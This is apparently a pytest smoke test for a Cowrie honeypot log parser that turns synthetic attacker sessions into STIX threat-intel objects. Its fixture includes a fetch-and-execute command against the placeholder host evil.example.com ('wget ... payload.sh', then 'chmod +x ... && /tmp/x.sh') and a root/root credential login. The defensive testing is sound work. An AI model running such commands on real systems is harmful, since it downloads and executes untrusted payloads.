"""Smoke test for the cowrie parser (migrated from its old
`if __name__` block so CI runs it). Generic parse/correlate/
STIX contract is covered in test_parsers.py."""
from __future__ import annotations

import tpot2cti.parsers.cowrie as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_cowrie_smoke():
    from datetime import datetime, timedelta, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = CowrieParser()

    # Build a small synthetic session: connect, login fail, login success,
    # 2 commands, 1 download.
    now = datetime.now(timezone.utc)
    base_doc = {
        "@timestamp": now.isoformat(),
        "src_ip": "1.2.3.4",
        "src_port": 50001,
        "dst_port": 22,
        "session": "deadbeef0001",
        "t-pot_hostname": "node1",
        "type": "Cowrie",
        "geoip": {"country_iso_code": "CN", "country_name": "China",
                   "city_name": "Beijing", "asn": 4134, "organization": "ChinaNet"},
    }

    events_raw = [
        {**base_doc, "eventid": _CONNECT_EVENTID,
         "@timestamp": (now + timedelta(seconds=0)).isoformat(),
         "hassh": "0a1b2c3d4e5f6789abc"},
        {**base_doc, "eventid": _LOGIN_FAIL_EVENTID,
         "@timestamp": (now + timedelta(seconds=2)).isoformat(),
         "username": "root", "password": "wrongpass"},
        {**base_doc, "eventid": _LOGIN_SUCCESS_EVENTID,
         "@timestamp": (now + timedelta(seconds=5)).isoformat(),
         "username": "root", "password": "root"},
        {**base_doc, "eventid": _COMMAND_EVENTID,
         "@timestamp": (now + timedelta(seconds=8)).isoformat(),
         "input": "wget http://evil.example.com/payload.sh -O /tmp/x.sh"},
        {**base_doc, "eventid": _COMMAND_EVENTID,
         "@timestamp": (now + timedelta(seconds=10)).isoformat(),
         "input": "chmod +x /tmp/x.sh && /tmp/x.sh"},
        {**base_doc, "eventid": _DOWNLOAD_EVENTID,
         "@timestamp": (now + timedelta(seconds=12)).isoformat(),
         "shasum": "abcdef0123456789" * 4, "url": "http://evil.example.com/payload.sh"},
    ]

    # parse
    events = []
    for d in events_raw:
        e = parser.parse(d)
        if e:
            events.append(e)
    print(f"parsed {len(events)} events")

    # correlate
    sessions = parser.correlate(events)
    print(f"correlated into {len(sessions)} session(s)")
    s = sessions[0]
    print(f"  session_id:        {s.session_id}")
    print(f"  src_ip:            {s.src_ip}")
    print(f"  auth_success:      {s.auth_success}")
    print(f"  commands:          {s.commands}")
    print(f"  malware_hashes:    {s.malware_hashes}")
    print(f"  urls:              {s.urls}")
    print(f"  domains:           {s.domains}")
    print(f"  credentials_tried: {s.credentials_tried}")
    print(f"  hassh:             {s.hassh}")
    print(f"  event_count:       {s.event_count}")

    # Build STIX (need a Config — use minimal env). Per refactor, the
    # parser no longer carries a build() method; the orchestrator calls
    # builder.build_cowrie_session(session) instead.
    import os
    from tpot2cti.parsers.base import _smoketest_env
    _smoketest_env()
    from tpot2cti.config import load_config
    from tpot2cti.stix.builder import STIXBuilder

    cfg = load_config()
    builder = STIXBuilder(cfg)
    objects = builder.build_cowrie_session(s)
    print(f"\nbuilt {len(objects)} STIX objects:")
    by_type = {}
    for o in objects:
        by_type[o["type"]] = by_type.get(o["type"], 0) + 1
    for t, n in sorted(by_type.items(), key=lambda x: -x[1]):
        print(f"  {t:25s} {n}")

    # Drive-by comparison
    driveby_objects = builder.build_driveby_session(s)
    print(f"\n(comparison) drive-by: {len(driveby_objects)} STIX objects")

    print("\nSmoke test passed.")
